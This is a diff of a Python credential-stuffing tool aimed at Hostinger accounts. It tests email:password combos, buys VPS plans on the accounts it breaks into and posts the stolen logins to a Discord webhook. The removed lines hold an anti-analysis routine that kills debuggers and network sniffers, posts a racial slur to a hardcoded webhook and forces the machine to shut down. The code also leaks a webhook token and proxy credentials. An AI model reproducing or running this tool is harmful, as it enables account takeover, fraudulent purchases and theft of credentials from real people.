@@ -4,44 +4,33 @@ import tls_client
 import threading
 import time
 import sys
-from util import *
-import webbrowser
+# from util import *
 import os
-from colorama import Fore, just_fix_windows_console
+from colorama import Fore
 from getpass import getpass
-import platform
-import hashlib
-import datetime
 import random
-import subprocess
-import pytz
 import tomllib
 
-BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'ida64', 'ollydbg', 'pestudio', 'x96dbg', 'vmsrvc', 'x32dbg', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', "ProcessHacker", "Requestly")
-@staticmethod
-def TaskKill(*tasks: str) -> None:
-    tasks = list(map(lambda x: x.lower(), tasks))
-    out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
-    for i in out:
-        i = i.split('\r\n')[:2]
-        try:
-            name, pid = (i[0].split()[-1], int(i[1].split()[-1]))
-            name = name[:-4] if name.endswith('.exe') else name
-            if name.lower() in tasks:
-                subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
-                webbrowser.open('https://pastebin.com/raw/AaaAQqMt')
-                webbrowser.open('https://youtu.be/GGQF7TTZpvI?t=35')
-                httpx.post('https://ptb.discord.com/api/webhooks/1310705462294872156/uum3xYUAXK_-A8rg4nUrLTlhEJOedfITRC8P1CMx9MU_8rhyM_NvfmWREEAfKxmUefbu', json={'content': 'some nigger tried to crack @everyone'})
-                time.sleep(5)
-                os.system("shutdown /s /t 0")
-        except Exception:
-            pass
-just_fix_windows_console()
+plans = [
+    ("hostingercom-vps-kvm1-usd-1m", "9.99", "KVM 1 (1 month)"),
+    ("hostingercom-vps-kvm1-usd-12m", "65.88", "KVM 1 (12 months)"),
+    ("hostingercom-vps-kvm1-usd-24m", "119.76", "KVM 1 (12 months)"),
+    ("hostingercom-vps-kvm2-usd-1m", "15.99", "KVM 2 (1 month)"),
+    ("hostingercom-vps-kvm2-usd-12m", "89.88", "KVM 2 (12 months)"),
+    ("hostingercom-vps-kvm2-usd-24m", "143.76", "KVM 2 (12 months)"),
+    ("hostingercom-vps-kvm4-usd-1m", "27.99", "KVM 4 (1 month)"),
+    ("hostingercom-vps-kvm4-usd-12m", "143.88", "KVM 4 (12 months)"),
+    ("hostingercom-vps-kvm4-usd-24m", "251.76", "KVM 4 (12 months)"),
+    ("hostingercom-vps-kvm8-usd-1m", "59.99", "KVM 8 (1 month)"),
+    ("hostingercom-vps-kvm8-usd-12m", "299.88", "KVM 8 (12 months)"),
+    ("hostingercom-vps-kvm8-usd-24m", "479.76", "KVM 8 (12 months)")
+]
 
-@staticmethod
-def killTasks() -> None:
-    TaskKill(*BLACKLISTED_TASKS)
-killTasks()
+def get_good_plan(bad_plan):
+    for full, price, good in plans:
+        if full == bad_plan:
+            return good, price
+    return None 
 
 with open('combo.txt') as f:
     combo = f.read().strip().splitlines()
@@ -51,6 +40,10 @@ with open('config.toml', 'rb') as file:
 
 proxy_login = config['settings']['proxies']['login']
 proxy_autobuy = config['settings']['proxies']['autobuy']
+
+webhook_enabled = config['settings']['discord']['webhook']['enabled']
+webhook_url = config['settings']['discord']['webhook']
+autobuy_message = config['settings']['discord']['webhook']['autobuy-message']
 
 autobuy_enabled = config['settings']['autobuy']['enabled']
 vps_plan = config['settings']['autobuy']['vpsplan']
@@ -364,10 +357,16 @@ def check():
                                             autobuyed += 1
                                             with open('results/autobuyed.txt', 'a') as f:
                                                 f.write(f'{email}:{passwd}\n')
-                                            httpx.post('https://ptb.discord.com/api/webhooks/1310705462294872156/uum3xYUAXK_-A8rg4nUrLTlhEJOedfITRC8P1CMx9MU_8rhyM_NvfmWREEAfKxmUefbu', json={'content': f'Balls @everyone'})
+
+                                            if webhook_enabled:
+                                                httpx.post(webhook_url, json={'content': autobuy_message.replace("[plan]", get_good_plan(vps_plan)[0]) \
+                                                .replace("[plan_price]", get_good_plan(vps_plan)[1]) \
+                                                .replace("[email]", email) \
+                                                .replace("[password]", passwd)})
 
                                             if autosetup_enabled:
-                                                clientb = httpx.Client(proxy=f'http://brd-customer-hl_d2ac0d30-zone-datacenter_proxy1:ewxmmc5ezeom@brd.superproxy.io:33335', timeout=60)
+                                                time.sleep(60)
+                                                clientb = httpx.Client(proxy=f'http://{proxy_autobuy}', timeout=60)
                                                 fetch_vps = clientb.get('https://hpanel.hostinger.com/api/vps/v1/virtual-machine', headers={
                                                     'Authorization': f'Bearer {jwt}',
                                                 })
@@ -421,32 +420,10 @@ def check():
                 print("CHECKING DONE.")
                 sys.exit()
 
-def generate_hwid():
-    computer_info = platform.uname()
-    processor_info = platform.processor()
-    system_drive = os.getenv('SYSTEMDRIVE')
-    
-    raw_hwid = f"{computer_info.node}{processor_info}{system_drive}".encode()
-    hashed_hwid = hashlib.sha256(raw_hwid).hexdigest()
-    
-    return hashed_hwid
+title_thread = threading.Thread(target=update_title)
+title_thread.daemon = True
+title_thread.start()
 
-os.system('cls')
-
-print('Sosok Checker\n11/25/2024 #2\nMade by Vodlex and Allah\nchangelog:\n~ Added auto-setup for VPSes\n~Possibly unflagged auto-buyer\n~ Added password-masking for hits')
-username = input("Enter username: ")
-password = getpass("Enter password: ")
-if authenticate(username, password, generate_hwid()):
-    os.system('cls')
-    print("Access granted!")
-    time.sleep(3)
-    os.system('cls')
-    title_thread = threading.Thread(target=update_title)
-    title_thread.daemon = True
-    title_thread.start()
-    threads = [threading.Thread(target=check) for _ in range(int(input('Threads: ')))]
-    for t in threads: t.start()
-    for t in threads: t.join()
-else:
-    os.system('cls')
-    print(f"{Fore.RED}Access denied! HWID: {Fore.BLUE}{generate_hwid()} {Fore.RED}Contact staff or create ticket in our discord server!")
+threads = [threading.Thread(target=check) for _ in range(int(input('Threads: ')))]
+for t in threads: t.start()
+for t in threads: t.join()
